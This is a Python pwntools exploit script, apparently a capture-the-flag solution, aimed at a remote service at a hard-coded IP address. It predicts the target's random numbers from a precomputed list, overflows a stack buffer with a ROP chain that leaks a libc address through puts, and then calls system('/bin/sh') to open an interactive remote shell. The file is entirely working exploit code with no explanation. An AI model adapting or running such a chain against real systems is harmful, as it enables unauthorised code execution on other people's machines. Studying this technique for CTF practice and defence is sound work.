from pwn import *
context.log_level="debug"
# sh=process("./pwn")
sh=remote('175.20.8.35',9999)
randlist=[0xa6381cc,0x335158c7,0x126801ab,0x54f1c0eb,0x23daf19f,0x5a47cda9,0x562f3700,0x7be8a675,0x28df69d7,0x6b793445,0x41a0a67c,0x2b2fdf95,0x5fb95c74,0x22ab5187,0x5e74ff04,0x7721ecb7,0x76ef7e82,0x3019cf70,0x29e8f2f3,0x43672bdc,0x305f4452,0x4ee72904,0x8392dc8,0x18048ce9,0x449df219,0xa5525ac,0x7bb103b2,0x59c39497,0x5fe7a7ad,0x769c90f1,0x723d311e,0x6a4b2979,0x29ede9b9,0x4a532c9,0x3f3cea65,0x4dc8db58,0x5eed0072,0x156c2165,0x49b181cd,0x7cc6a49,0xe555aa,0xb522849,0x32fc49de,0x609eb21e,0x2dfd79d0,0x117148e2,0x57c09ed6,0x24ecf853,0x418b1852,0x1a991c9,0x6854242f,0x71ea5ca4,0x5090bacd,0x708d51f8,0x9eee98e,0x152eace6,0x7ae277a4,0x59fed40,0x6ef2417e,0x5aca1f51,0x7c3c7e32,0x612f729c,0x451548ca,0x262a67eb,0x65d4a565,0x452332f,0x73f34343,0x44c1a5d7,0x19be5495,0x3da4c510,0x4c8e1020,0x1aa3aa3f,0x48f6ed5a,0x7f8a59fe,0x7b425c5e,0x76f4672a,0x10fba2e0,0x5302fb34,0x1be15f7d,0x5286bb32,0x54ac8cfd,0x43583ad,0x447117d7,0x253d47ca,0x74c2d5a5,0x4e600165,0x3a6bf4b1,0x6fa54d49,0x53ffeea5,0x295e362f,0x4a6f6c9a,0x503c6cd7,0xa8da8cb,0xf84b564,0x7666d4c2,0x70624e30,0x13d6e894,0x6a5a1805,0x3523f407,0x2d953d29]
payload=b'a'*10+b'b'*4+b'a'*4
# gdb.attach(sh)
sh.sendafter(b"Please enter your name:\n",payload)
for i in range(100):
    sh.sendafter(b"Guess the random number:\n",p64((randlist[i]%100)+1))

elf=ELF("./pwn")
libc=ELF("./libc-2.31.so")
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
gift=0x40125D
rdi=0x0000000000401443
payload=b'a'*0x38+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(gift)
sh.sendline(payload)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libcbase=leak_libc-libc.sym['puts']
success(hex(libcbase))
system=libc.sym['system']+libcbase
binsh=libc.search(b'/bin/sh').__next__()+libcbase
payload=b'a'*0x38+p64(rdi)+p64(binsh)+p64(rdi+1)+p64(system)+p64(gift)
# gdb.attach(sh)
sh.sendline(payload)
sh.interactive()